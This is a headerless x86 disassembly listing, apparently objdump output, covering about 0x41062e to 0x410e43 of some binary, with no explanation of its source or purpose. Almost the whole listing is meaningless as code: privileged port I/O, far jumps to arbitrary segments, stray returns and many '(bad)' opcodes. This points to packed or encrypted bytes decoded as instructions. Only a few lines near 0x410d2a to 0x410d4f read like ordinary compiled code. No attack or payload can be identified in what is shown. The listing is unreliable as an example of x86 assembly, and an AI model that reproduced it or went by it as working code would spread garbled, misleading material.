  41062e:	stc    
  41062f:	dec    ecx
  410630:	jmp    0x4105f7
  410632:	out    0xf0,eax
  410634:	aad    0x76
  410636:	iret   
  410637:	adc    cl,BYTE PTR ds:0xb8d367f8
  41063d:	inc    edx
  41063e:	pop    es
  41063f:	mov    cl,0x57
  410641:	mov    ch,0x7c
  410643:	and    DWORD PTR [ecx+0x6b],edx
  410646:	jl     0x410655
  410648:	int3   
  410649:	add    al,0x45
  41064b:	clc    
  41064c:	mov    bl,0x2f
  41064e:	inc    eax
  41064f:	pop    edi
  410650:	and    BYTE PTR [esp+edx*4],0x7
  410654:	pop    ebp
  410655:	push   0x5e89cb92
  41065a:	jle    0x410663
  41065c:	pop    ebp
  41065d:	popa   
  41065e:	imul   edi,DWORD PTR [ebp-0x58],0x67ce961
  410665:	outs   dx,BYTE PTR ds:[esi]
  410666:	xor    al,0x8c
  410668:	pop    ecx
  410669:	mov    BYTE PTR [ebx+0x2e2b1f8b],0x40
  410670:	packssdw mm7,QWORD PTR [edi]
  410673:	push   cs
  410674:	test   BYTE PTR ds:[ebx],0x77
  410678:	scas   al,BYTE PTR es:[edi]
  410679:	loopne 0x4106ce
  41067b:	sahf   
  41067c:	retf   0x2c16
  41067f:	add    al,0xe8
  410681:	dec    ecx
  410682:	int    0x54
  410684:	out    dx,al
  410685:	data16 in al,0x66
  410688:	push   esi
  410689:	sub    ebx,DWORD PTR [ebp-0x55]
  41068c:	mov    edx,0xc0bf84be
  410691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410692:	ds jle 0x410713
  410695:	sub    eax,0x5b9f3dd5
  41069a:	dec    ebx
  41069b:	outs   dx,BYTE PTR ds:[esi]
  41069c:	popf   
  41069d:	fiadd  WORD PTR [esi-0x80]
  4106a0:	adc    al,0x25
  4106a2:	div    BYTE PTR [bp+si+0x4f66]
  4106a7:	addr16 cmc 
  4106a9:	arpl   WORD PTR [eax+0x155e4725],bp
  4106af:	mov    eax,0x999e7667
  4106b4:	or     eax,0xa9814d62
  4106b9:	stc    
  4106ba:	aaa    
  4106bb:	and    DWORD PTR [edx+ebp*4],ecx
  4106be:	xchg   esp,eax
  4106bf:	jo     0x410725
  4106c1:	outs   dx,DWORD PTR ds:[esi]
  4106c2:	not    cl
  4106c4:	in     al,dx
  4106c5:	hlt    
  4106c6:	adc    BYTE PTR [ebp+0x3e],bh
  4106c9:	mov    cl,0xfc
  4106cb:	rol    DWORD PTR [ebx+0x37],1
  4106ce:	sub    esi,0x647bd3d2
  4106d4:	jle    0x4106a7
  4106d6:	and    BYTE PTR [edi+0x36],bl
  4106d9:	nop
  4106da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106db:	or     BYTE PTR [ebx-0x21ad8cc2],dl
  4106e1:	mov    ecx,0xdf0359a9
  4106e6:	hlt    
  4106e7:	push   ds
  4106e8:	mov    ch,0x59
  4106ea:	jb     0x410700
  4106ec:	xchg   esi,eax
  4106ed:	clc    
  4106ee:	inc    ecx
  4106ef:	xor    eax,0xd676c8fd
  4106f4:	dec    DWORD PTR [edi]
  4106f6:	xchg   BYTE PTR [ecx],ah
  4106f8:	dec    ebx
  4106f9:	mov    ecx,DWORD PTR [ebp-0x1ab5b72e]
  4106ff:	inc    edi
  410700:	mov    ebx,DWORD PTR [ebp+0x7d]
  410703:	sbb    BYTE PTR [esi],0xfc
  410706:	fstp   DWORD PTR [ebp+eiz*4-0x78]
  41070a:	or     eax,0x68e31fdb
  41070f:	jmp    0x410733
  410711:	sti    
  410712:	ds es popa 
  410715:	push   ds
  410716:	adc    al,0xe2
  410718:	loop   0x410735
  41071a:	cs jmp 0x1f23:0xc6df712c
  410722:	inc    ebp
  410723:	xor    DWORD PTR [edi+ecx*4],0xa421e17c
  41072a:	dec    ebx
  41072b:	test   eax,0x86085d43
  410730:	or     eax,0xedf92490
  410735:	das    
  410736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410737:	push   0x76
  410739:	pop    ds
  41073a:	push   esp
  41073b:	ja     0x41073c
  41073d:	imul   ebp,DWORD PTR cs:[eax],0xffffffe9
  410741:	or     ecx,DWORD PTR [esi]
  410743:	jp     0x4107c0
  410745:	jmp    0x410719
  410747:	jecxz  0x41072b
  410749:	pop    ebx
  41074a:	nop
  41074b:	push   esp
  41074c:	rcr    BYTE PTR [esi],1
  41074e:	xchg   edi,eax
  41074f:	cmp    ebp,ebp
  410751:	and    cl,dh
  410753:	(bad)  
  410754:	cmp    DWORD PTR [ebx+0x581dd95f],esi
  41075a:	fwait
  41075b:	cmp    bl,0x3f
  41075e:	add    edi,DWORD PTR [ebp+ecx*2+0x32becefb]
  410765:	bound  edx,QWORD PTR [edi]
  410767:	adc    DWORD PTR [ebx-0x79911376],ecx
  41076d:	or     cl,ah
  41076f:	ror    dl,0xf6
  410772:	cmp    dh,0x2
  410775:	push   ebp
  410776:	into   
  410777:	shl    DWORD PTR [esi+0x42],cl
  41077a:	outs   dx,DWORD PTR ds:[esi]
  41077b:	shl    BYTE PTR [ebx-0x61],cl
  41077e:	and    DWORD PTR [edx+0x4f],0x25
  410782:	iret   
  410783:	xchg   DWORD PTR [eax+eax*8+0x491edb1d],ebp
  41078a:	popa   
  41078b:	aaa    
  41078c:	lds    ebx,FWORD PTR [eax+0x71]
  41078f:	and    al,0x1d
  410791:	push   cs
  410792:	ins    BYTE PTR es:[edi],dx
  410793:	jl     0x4107ce
  410795:	hlt    
  410796:	in     al,dx
  410797:	sbb    dh,BYTE PTR [edi]
  410799:	jnp    0x41078e
  41079b:	out    0x24,eax
  41079d:	adc    BYTE PTR [esi],ch
  41079f:	inc    esi
  4107a0:	xchg   edx,eax
  4107a1:	bound  ebp,QWORD PTR [eax]
  4107a3:	xlat   BYTE PTR ds:[ebx]
  4107a4:	pushf  
  4107a5:	add    ebp,0x57fc98c9
  4107ab:	test   BYTE PTR [edi],cl
  4107ad:	popf   
  4107ae:	ins    DWORD PTR es:[edi],dx
  4107af:	pop    es
  4107b0:	adc    eax,DWORD PTR [esi+0x25484c93]
  4107b6:	jmp    FWORD PTR [ebp+0x11]
  4107b9:	adc    cl,BYTE PTR [ebx+ebx*1-0x71ee109a]
  4107c0:	jge    0x410810
  4107c2:	inc    esi
  4107c3:	jecxz  0x41081e
  4107c5:	jp     0x4107b1
  4107c7:	gs jl  0x41079e
  4107ca:	leave  
  4107cb:	(bad)  
  4107cc:	outs   dx,DWORD PTR ds:[esi]
  4107cd:	mov    esp,DWORD PTR [esi]
  4107cf:	pop    DWORD PTR [edi-0x67d43f96]
  4107d5:	call   0xa355db38
  4107da:	xor    eax,0x93c06406
  4107df:	mov    bl,0x57
  4107e1:	jp     0x41077b
  4107e3:	js     0x410824
  4107e5:	sub    ecx,DWORD PTR [eax+eiz*4+0x2a6f153b]
  4107ec:	test   al,0x1b
  4107ee:	mov    ebx,0x17f65a5e
  4107f3:	push   esi
  4107f4:	inc    esi
  4107f5:	cmp    al,0x33
  4107f7:	sbb    eax,0xdf2be2e0
  4107fc:	cmp    ebx,edx
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	or     esi,DWORD PTR [ecx+ebx*2-0x56]
  410813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	call   FWORD PTR [ebx*1+0x2c896559]
  410822:	push   eax
  410823:	add    esi,eax
  410825:	outs   dx,DWORD PTR fs:[esi]
  410827:	outs   dx,DWORD PTR ds:[esi]
  410828:	mov    eax,DWORD PTR [ebx+ebp*1]
  41082b:	xor    DWORD PTR [edi-0x73],ebx
  41082e:	les    edi,FWORD PTR [ebx+0xc]
  410831:	fsub   QWORD PTR [ecx+eax*2]
  410834:	rcr    DWORD PTR [eax-0x6525d89a],0xc2
  41083b:	bound  esi,QWORD PTR [ebp-0x67]
  41083e:	xchg   edi,eax
  41083f:	cmp    al,0xe0
  410841:	je     0x4107fc
  410843:	sbb    dl,BYTE PTR [edi+0x43]
  410846:	ror    DWORD PTR [edi],1
  410848:	popa   
  410849:	hlt    
  41084a:	push   0x7dfa96f6
  41084f:	sbb    BYTE PTR [esi+0x424f21e1],bh
  410855:	gs (bad) 
  410857:	cli    
  410858:	(bad)  
  410859:	mov    ebp,0xa0f03702
  41085e:	test   edi,ecx
  410860:	push   cs
  410861:	imul   edx,DWORD PTR [edi+0x4bbed1e8],0x2ff372dc
  41086b:	or     ecx,DWORD PTR [ebx+0x57]
  41086e:	(bad)  
  41086f:	sub    BYTE PTR [esi+0x43830cf4],bh
  410875:	lods   al,BYTE PTR ds:[esi]
  410876:	popf   
  410877:	mov    DWORD PTR [ebp-0xc],ebp
  41087a:	fldcw  WORD PTR [ebx+0x28cbf5b1]
  410880:	addr16 jns 0x4108f9
  410883:	or     al,0xda
  410885:	adc    eax,0xcec4f6c0
  41088a:	mov    bl,ah
  41088c:	sub    BYTE PTR [edi],0x5
  41088f:	inc    esp
  410890:	sahf   
  410891:	mov    ds:0x69dc0fcd,al
  410896:	add    ah,ch
  410898:	frstor [edi]
  41089a:	jno    0x410845
  41089c:	shl    BYTE PTR [edi-0xb],1
  41089f:	pop    edx
  4108a0:	retf   0x5758
  4108a3:	xor    dl,al
  4108a5:	mov    dl,0x6a
  4108a7:	shr    ah,1
  4108a9:	cmp    DWORD PTR [esi],edx
  4108ab:	test   DWORD PTR [edi+0x46517d1e],0x29d26c72
  4108b5:	sub    al,0xba
  4108b7:	sahf   
  4108b8:	imul   eax,edi,0xffffffc4
  4108bb:	mov    ecx,0xa210b57e
  4108c0:	fwait
  4108c1:	ret    
  4108c2:	popf   
  4108c3:	xlat   BYTE PTR ds:[ebx]
  4108c4:	daa    
  4108c5:	loopne 0x41085c
  4108c7:	aas    
  4108c8:	push   esp
  4108c9:	pop    ss
  4108ca:	lock pop ebp
  4108cc:	out    dx,al
  4108cd:	stos   BYTE PTR es:[edi],al
  4108ce:	es call 0x58a1:0xc0335fe4
  4108d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108d7:	xor    eax,0xef6194b1
  4108dc:	jmp    0x4108ac
  4108de:	iret   
  4108df:	out    0x50,al
  4108e1:	dec    ecx
  4108e2:	lahf   
  4108e3:	aad    0x72
  4108e5:	mov    ah,0xe6
  4108e7:	dec    esp
  4108e8:	test   dh,cl
  4108ea:	addr16 dec eax
  4108ec:	cmp    bh,BYTE PTR [esi+0x561ba898]
  4108f2:	ret    
  4108f3:	in     al,dx
  4108f4:	add    esp,DWORD PTR [ecx+0x7c2c7bca]
  4108fa:	push   cs
  4108fb:	cmp    ebp,DWORD PTR [eax+0x11]
  4108fe:	pushf  
  4108ff:	iret   
  410900:	inc    esi
  410901:	scas   al,BYTE PTR es:[edi]
  410902:	repnz gs sub dh,bl
  410906:	add    al,ah
  410908:	jmp    0x51d4b229
  41090d:	jl     0x4108c6
  41090f:	jbe    0x4108f1
  410911:	lahf   
  410912:	xor    ebx,DWORD PTR [ebx+esi*2]
  410915:	mov    ds:0xafaff499,eax
  41091a:	mov    al,ds:0x9f381101
  41091f:	test   eax,0x44e68587
  410924:	sbb    al,0x6b
  410926:	(bad)  
  410927:	out    dx,al
  410928:	es sbb eax,0x70a3d32c
  41092e:	loop   0x41091f
  410930:	push   ebx
  410931:	iret   
  410932:	mov    fs,WORD PTR [edi]
  410934:	sub    eax,0xeaef60f3
  410939:	sbb    dh,dh
  41093b:	retf   0xf090
  41093e:	mov    ah,BYTE PTR [eax]
  410940:	into   
  410941:	pop    ds
  410942:	sbb    edx,DWORD PTR [ecx+0x3f15c02d]
  410948:	push   edx
  410949:	fcomp  QWORD PTR [esi+0x69]
  41094c:	xchg   ebp,eax
  41094d:	jno    0x410993
  41094f:	mov    ecx,0x2574afb0
  410954:	mov    edx,0x52ae5e8d
  410959:	inc    esi
  41095a:	aad    0xf4
  41095c:	dec    esp
  41095d:	xor    eax,0x7c1435f4
  410962:	fst    DWORD PTR [ebx-0x6cf5d508]
  410968:	iret   
  410969:	jne    0x410940
  41096b:	fldenv [ebx+edx*8+0x38]
  41096f:	push   esp
  410970:	add    al,0x35
  410972:	mov    al,ds:0xa69c0210
  410977:	mov    al,BYTE PTR [eax-0x4d]
  41097a:	lods   al,BYTE PTR ds:[esi]
  41097b:	and    BYTE PTR [eax],al
  41097d:	js     0x4109a7
  41097f:	or     BYTE PTR [eax+0x30128ed2],ah
  410985:	pop    ebx
  410986:	mov    bl,ch
  410988:	ds mov dh,0x45
  41098b:	out    0x48,eax
  41098d:	push   0x1039fb5b
  410992:	pop    ss
  410993:	xchg   edx,eax
  410994:	rcl    dh,0x8b
  410997:	mov    ds:0x4da5823e,al
  41099c:	jnp    0x41095d
  41099e:	ror    DWORD PTR [esi+0x5d114830],1
  4109a4:	shl    DWORD PTR [edi-0x71da718a],cl
  4109aa:	xlat   BYTE PTR ds:[ebx]
  4109ab:	add    eax,0xe91c72c7
  4109b0:	ret    
  4109b1:	dec    esi
  4109b2:	(bad)  
  4109b3:	sub    ch,dl
  4109b5:	sub    DWORD PTR [eax-0xe397dde],ecx
  4109bb:	xchg   esi,eax
  4109bc:	cmc    
  4109bd:	add    ah,al
  4109bf:	mov    edi,0x2b936ccd
  4109c4:	imul   eax,DWORD PTR [ecx-0x71],0xb
  4109c8:	pop    edx
  4109c9:	(bad)  
  4109ca:	sub    ebp,DWORD PTR [ecx+ebx*2-0x772f2014]
  4109d1:	add    al,0x14
  4109d3:	jns    0x410964
  4109d5:	pop    edx
  4109d6:	pop    edx
  4109d7:	pop    esi
  4109d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109d9:	mov    bl,0xc0
  4109db:	sbb    al,0x5c
  4109dd:	pop    ecx
  4109de:	push   ebx
  4109df:	xor    eax,DWORD PTR [eax-0x57464240]
  4109e5:	sub    bh,BYTE PTR [eax]
  4109e7:	mov    al,ds:0xb8ac4d77
  4109ec:	and    edx,DWORD PTR [edx+0x4ce45776]
  4109f2:	arpl   WORD PTR [eax+0x6b],sp
  4109f5:	and    DWORD PTR [ebp+0x7486f3ae],edx
  4109fb:	sbb    al,ah
  4109fd:	in     eax,dx
  4109fe:	sub    ch,BYTE PTR [eax+0x2b29e458]
  410a04:	mov    al,0xb8
  410a06:	or     BYTE PTR [eax+0x4cd3ec93],bl
  410a0c:	mov    ebp,0x6846a302
  410a11:	and    DWORD PTR [edi],edi
  410a13:	mov    eax,0x6f26da23
  410a18:	mov    edx,DWORD PTR ds:0x9fe8a2b4
  410a1e:	inc    BYTE PTR [edx]
  410a20:	aad    0x7
  410a22:	shr    BYTE PTR [ecx],cl
  410a24:	mov    esi,0xd431acf8
  410a29:	or     eax,0x4d94a26e
  410a2e:	sti    
  410a2f:	sbb    eax,0x22d900f5
  410a34:	popa   
  410a35:	jecxz  0x410a98
  410a37:	rcr    DWORD PTR [edx-0x5a],0xdb
  410a3b:	fnstenv [ebp-0x6e]
  410a3e:	enter  0x1c5e,0xe8
  410a42:	xchg   edx,eax
  410a43:	out    dx,eax
  410a44:	je     0x410a8f
  410a46:	jl     0x410a6e
  410a48:	cli    
  410a49:	fst    QWORD PTR [ecx-0x6fc4ef41]
  410a4f:	mov    edi,0x7e7dfd12
  410a54:	sahf   
  410a55:	call   0xf7a9:0xd2a873bc
  410a5c:	out    dx,al
  410a5d:	mov    ah,0x51
  410a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a60:	xlat   BYTE PTR ds:[ebx]
  410a61:	test   BYTE PTR [ecx],al
  410a63:	pop    esi
  410a64:	sahf   
  410a65:	mov    ecx,0x7bba3a95
  410a6a:	clc    
  410a6b:	retf   0xe23a
  410a6e:	mov    edx,0x6c725882
  410a73:	je     0x410aae
  410a75:	add    bl,ch
  410a77:	es sahf 
  410a79:	aad    0xb3
  410a7b:	mov    dh,0x5
  410a7d:	(bad)  
  410a7e:	outs   dx,DWORD PTR ds:[esi]
  410a7f:	call   FWORD PTR [eax]
  410a81:	das    
  410a82:	cdq    
  410a83:	out    dx,eax
  410a84:	cdq    
  410a85:	adc    al,0xf
  410a87:	xchg   DWORD PTR [eax],ecx
  410a89:	add    BYTE PTR [eax],al
  410a8b:	add    BYTE PTR [ebx-0x1d1627ab],cl
  410a91:	adc    al,0x0
  410a93:	add    BYTE PTR [ebx+0x7d8bd055],cl
  410a99:	cld    
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	idiv   DWORD PTR [ebp+0x4f]
  410ab1:	xchg   ecx,eax
  410ab2:	icebp  
  410ab3:	adc    edx,DWORD PTR [esi+0x78]
  410ab6:	js     0x410a9d
  410ab8:	jle    0x410b32
  410aba:	js     0x410b2d
  410abc:	outs   dx,DWORD PTR ds:[esi]
  410abd:	cmp    DWORD PTR [edi-0x6e],ebp
  410ac0:	sbb    BYTE PTR [eax],dh
  410ac2:	jl     0x410b12
  410ac4:	add    dh,BYTE PTR [esi]
  410ac6:	popf   
  410ac7:	retf   0x2a4e
  410aca:	pop    DWORD PTR [edi-0x6056f8f9]
  410ad0:	inc    ecx
  410ad1:	mov    edi,DWORD PTR [ebx-0x5dc080e0]
  410ad7:	or     dl,0x5
  410ada:	sub    eax,0x7e3a29f
  410adf:	or     edi,DWORD PTR [ecx-0xc73c2a3]
  410ae5:	or     bl,BYTE PTR [ecx+0x5eefd577]
  410aeb:	and    ebp,DWORD PTR [ecx]
  410aed:	pusha  
  410aee:	mov    ebx,0xaa7657cb
  410af3:	add    al,0x32
  410af5:	sub    DWORD PTR [edx-0x8],eax
  410af8:	popf   
  410af9:	fmul   st,st(7)
  410afb:	rcr    ecx,1
  410afd:	popf   
  410afe:	in     al,0x6f
  410b00:	add    eax,0x8d89069f
  410b05:	addr16 mov ds:0xb223,al
  410b09:	out    0x28,eax
  410b0b:	pop    es
  410b0c:	mov    ecx,0xddada60b
  410b11:	dec    edi
  410b12:	gs mov dh,0x4c
  410b15:	mov    dl,0x6e
  410b17:	adc    al,0x39
  410b19:	ja     0x410b69
  410b1b:	stos   DWORD PTR es:[edi],eax
  410b1c:	int3   
  410b1d:	(bad)  
  410b1e:	fwait
  410b1f:	in     eax,0x85
  410b21:	lea    ecx,[ecx-0x49030f3a]
  410b27:	push   edi
  410b28:	mov    dh,0x43
  410b2a:	fwait
  410b2b:	out    dx,eax
  410b2c:	add    al,bh
  410b2e:	mov    ds:0x7948e294,al
  410b33:	fdivr  DWORD PTR [edx-0xe]
  410b36:	cmp    eax,0xc4f059a8
  410b3b:	xchg   esp,eax
  410b3c:	xor    al,0x7c
  410b3e:	outs   dx,DWORD PTR ds:[esi]
  410b3f:	cmc    
  410b40:	jmp    0x77ff:0x1b3df009
  410b47:	das    
  410b48:	mov    dh,0x2e
  410b4a:	dec    esi
  410b4b:	and    eax,0xe2ca313e
  410b50:	mov    ebp,0x76534cf1
  410b55:	jmp    0x410b52
  410b57:	xor    DWORD PTR [ebx+0x1f829703],ecx
  410b5d:	iret   
  410b5e:	inc    edx
  410b5f:	nop
  410b60:	sub    al,0x5d
  410b62:	pop    eax
  410b63:	pop    esp
  410b64:	dec    ecx
  410b65:	adc    al,0x36
  410b67:	arpl   WORD PTR [esp+edx*4+0x3cc253f5],cx
  410b6e:	call   0x9a7e:0xcc0a3831
  410b75:	retf   0x8140
  410b78:	or     BYTE PTR [ebp+0x75aa257d],dh
  410b7e:	inc    edi
  410b7f:	jb     0x410b04
  410b81:	sti    
  410b82:	jecxz  0x410b68
  410b84:	sbb    eax,0xccc2296d
  410b89:	popf   
  410b8a:	imul   edi,ebx,0xffffffe2
  410b8d:	repnz ins BYTE PTR es:[edi],dx
  410b8f:	fild   WORD PTR es:[ebp-0x80]
  410b93:	call   0xd8304709
  410b98:	inc    ebp
  410b99:	inc    ebp
  410b9a:	xor    eax,0xeb9d5a21
  410b9f:	jge    0x410bd8
  410ba1:	stos   DWORD PTR es:[edi],eax
  410ba2:	xchg   ebx,eax
  410ba3:	push   edi
  410ba4:	nop
  410ba5:	xor    DWORD PTR [edi],0xffffffa0
  410ba8:	idiv   DWORD PTR [ebp-0x13]
  410bab:	enter  0x3ed,0xd3
  410baf:	adc    BYTE PTR [ebx-0x6d],0xf2
  410bb3:	sti    
  410bb4:	jmp    DWORD PTR [esi-0x56b832f7]
  410bba:	loope  0x410b79
  410bbc:	cmc    
  410bbd:	and    esp,ecx
  410bbf:	mov    al,BYTE PTR [eax-0x4]
  410bc2:	out    0xb2,al
  410bc4:	fnstcw WORD PTR [ecx-0x7b307ee9]
  410bca:	sbb    BYTE PTR [eax-0x25],0xc5
  410bce:	jle    0x410c09
  410bd0:	lahf   
  410bd1:	call   0xbf05:0x992857da
  410bd8:	mov    DWORD PTR [esi+edx*4+0x7],ebp
  410bdc:	int    0x95
  410bde:	inc    ecx
  410bdf:	xor    DWORD PTR [edx+0x276154a0],esi
  410be5:	inc    ebp
  410be6:	adc    al,0x8e
  410be8:	pushf  
  410be9:	cli    
  410bea:	and    eax,0x88888080
  410bef:	rcr    DWORD PTR ds:0xdd889893,cl
  410bf5:	or     eax,0xe29e36fa
  410bfa:	or     ch,BYTE PTR [ebp+0xa]
  410bfd:	adc    bl,BYTE PTR [esi]
  410bff:	adc    BYTE PTR [eax-0x55508132],0x7c
  410c06:	push   edx
  410c07:	fidiv  WORD PTR [edi]
  410c09:	clc    
  410c0a:	mov    cl,0x7e
  410c0c:	mov    dl,0x9a
  410c0e:	sub    dl,BYTE PTR [ebx-0x15f64e3a]
  410c14:	stc    
  410c15:	retf   0xea99
  410c18:	stc    
  410c19:	arpl   ax,bx
  410c1b:	add    DWORD PTR [eax+0x18a77d76],esi
  410c21:	xor    al,0xad
  410c23:	jmp    DWORD PTR [esi]
  410c25:	inc    eax
  410c26:	rol    BYTE PTR [esi+0x507b25f3],0xe2
  410c2d:	jmp    0x2f83173d
  410c32:	ds es sub al,0x2f
  410c36:	push   edi
  410c37:	imul   eax,esp,0x19
  410c3a:	cmp    DWORD PTR [ebx+0x5c59cc91],edi
  410c40:	jo     0x410c4a
  410c42:	mov    eax,0x1f9dbb8e
  410c47:	adc    ebp,DWORD PTR [ecx]
  410c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c4a:	enter  0x30d6,0xc
  410c4e:	into   
  410c4f:	cmp    eax,0x49b63414
  410c54:	stos   DWORD PTR es:[edi],eax
  410c55:	retf   0xee05
  410c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c59:	retf   0xddf5
  410c5c:	inc    esi
  410c5d:	pop    esp
  410c5e:	xor    BYTE PTR [ecx-0x62],dl
  410c61:	jmp    0xb122:0x61c05a50
  410c68:	lahf   
  410c69:	shl    dl,1
  410c6b:	cwde   
  410c6c:	mov    dl,0x45
  410c6e:	mov    eax,ds:0x9f232a2f
  410c73:	adc    eax,0x7e41f4a9
  410c78:	fcom   DWORD PTR ds:0xedf6a3e8
  410c7e:	push   esi
  410c7f:	mov    eax,0x307e387e
  410c84:	push   ebx
  410c85:	jno    0x410cf6
  410c87:	add    eax,0xbb5f9731
  410c8c:	lar    edx,WORD PTR gs:[ecx+0x26bcafb2]
  410c94:	mov    eax,ds:0xc0770619
  410c99:	or     eax,0x1eb38706
  410c9e:	sbb    eax,0x889fd846
  410ca3:	push   0x79
  410ca5:	jne    0x410c53
  410ca7:	addr16 or ah,cl
  410caa:	cli    
  410cab:	(bad)  
  410cac:	(bad)  [esi+0x1d]
  410caf:	sahf   
  410cb0:	and    BYTE PTR [ecx-0x7d],ch
  410cb3:	jbe    0x410ca5
  410cb5:	fnstsw WORD PTR [ebp-0x78e171ce]
  410cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cbc:	in     al,0xe1
  410cbe:	inc    edi
  410cbf:	and    eax,edx
  410cc1:	ins    DWORD PTR es:[edi],dx
  410cc2:	and    al,0x96
  410cc4:	ret    0x6220
  410cc7:	sti    
  410cc8:	jns    0x410cef
  410cca:	adc    BYTE PTR [ebx-0x7b],al
  410ccd:	and    BYTE PTR [edx],bh
  410ccf:	mov    ebx,0x45b7289f
  410cd4:	(bad)  [esi+esi*4+0x5ccc3bfc]
  410cdb:	ss out dx,eax
  410cdd:	jl     0x410c7b
  410cdf:	std    
  410ce0:	inc    esp
  410ce1:	push   eax
  410ce2:	jo     0x410cff
  410ce4:	jb     0x410c9e
  410ce6:	jecxz  0x410d01
  410ce8:	dec    edx
  410ce9:	jg     0x410d2f
  410ceb:	or     esi,DWORD PTR [esi+0x17f93174]
  410cf1:	in     eax,dx
  410cf2:	into   
  410cf3:	lods   al,BYTE PTR ds:[esi]
  410cf4:	cwde   
  410cf5:	in     eax,dx
  410cf6:	popf   
  410cf7:	add    bl,BYTE PTR [esi+0x60]
  410cfa:	xchg   BYTE PTR [eiz*1-0x51308410],dl
  410d01:	xchg   ebx,eax
  410d02:	dec    ebx
  410d03:	or     al,BYTE PTR [ebp+0x1554bfbe]
  410d09:	hlt    
  410d0a:	xchg   ecx,eax
  410d0b:	jg     0x410d18
  410d0d:	out    dx,eax
  410d0e:	or     al,0xe1
  410d10:	fucom  st(5)
  410d12:	mov    ah,0x1
  410d14:	add    al,dh
  410d16:	out    dx,al
  410d17:	mov    edi,0x7c2e576e
  410d1c:	imul   esp,DWORD PTR [esi],0x23e0d4ef
  410d22:	sub    eax,0x3695ac3
  410d27:	stc    
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	out    dx,al
  410d61:	sbb    al,0x80
  410d63:	pop    ecx
  410d64:	clc    
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	mov    gs,WORD PTR [esi]
  410d6e:	mov    ecx,0x27ca5c98
  410d73:	and    eax,esi
  410d75:	test   eax,0x5ed193f4
  410d7a:	and    DWORD PTR [eax-0x213f64b8],eax
  410d80:	int3   
  410d81:	les    edi,FWORD PTR [ebx+eax*1-0x78affb3b]
  410d88:	sub    DWORD PTR [ebx],ebx
  410d8a:	push   ss
  410d8b:	dec    esi
  410d8c:	sbb    ebp,0x41d36d03
  410d92:	sbb    DWORD PTR [ebx],ebp
  410d94:	ins    BYTE PTR es:[edi],dx
  410d95:	fidiv  WORD PTR [esi+0x7e6e77ca]
  410d9b:	test   BYTE PTR [esi-0x5200f93b],0xf3
  410da2:	pop    ecx
  410da3:	mov    eax,ds:0x233fbf24
  410da8:	dec    esp
  410da9:	sub    eax,0x2f161d40
  410dae:	call   0x80b0:0xae72845b
  410db5:	jg     0x410d86
  410db7:	ficomp DWORD PTR [esi+0x531c9bcf]
  410dbd:	(bad)
  410dc1:	inc    ecx
  410dc2:	mov    edi,0xedf0f666
  410dc7:	mov    ds:0x54dfe293,eax
  410dcc:	stos   DWORD PTR es:[edi],eax
  410dcd:	nop
  410dce:	xchg   BYTE PTR [edx],dl
  410dd0:	mov    edx,DWORD PTR [ebx+0x7eb445f1]
  410dd6:	fist   WORD PTR [ecx+0x67ca7d11]
  410ddc:	pop    eax
  410ddd:	cmp    cl,BYTE PTR [eax+0x1b]
  410de0:	xchg   ebx,eax
  410de1:	scas   eax,DWORD PTR es:[edi]
  410de2:	in     al,0xcb
  410de4:	pop    esp
  410de5:	xchg   esp,eax
  410de6:	inc    esi
  410de7:	ret    0x26f4
  410dea:	xor    eax,0x95ec1f88
  410def:	imul   ebx,DWORD PTR [ecx+0x5f92b900],0x56b8276c
  410df9:	xchg   ebx,eax
  410dfa:	xchg   ebx,eax
  410dfb:	loope  0x410db1
  410dfd:	add    al,0x24
  410dff:	sub    BYTE PTR [edx+0x1b],dl
  410e02:	push   0x273b0cc1
  410e07:	adc    eax,0xfd314b2b
  410e0c:	(bad)  
  410e0d:	stos   BYTE PTR es:[edi],al
  410e0e:	in     eax,dx
  410e0f:	cmp    edx,DWORD PTR [edi]
  410e11:	add    eax,0x64622f27
  410e16:	cs nop
  410e18:	gs ja  0x410e33
  410e1b:	cmc    
  410e1c:	sub    eax,0xfbfc823
  410e21:	test   DWORD PTR [edi-0x15],esp
  410e24:	cmp    al,0xf
  410e26:	pop    eax
  410e27:	(bad)  
  410e28:	mov    eax,0x4db9810
  410e2d:	cdq    
  410e2e:	nop
  410e2f:	push   ds
  410e30:	push   es
  410e31:	js     0x410db3
  410e33:	dec    esi
  410e34:	dec    esi
  410e35:	outs   dx,BYTE PTR ds:[esi]
  410e36:	push   0xc74f6e4
  410e3b:	inc    ebp
  410e3c:	mov    ebp,0xdab6d3e7
  410e41:	jbe    0x410e74
  410e43:	sub    eax,esp
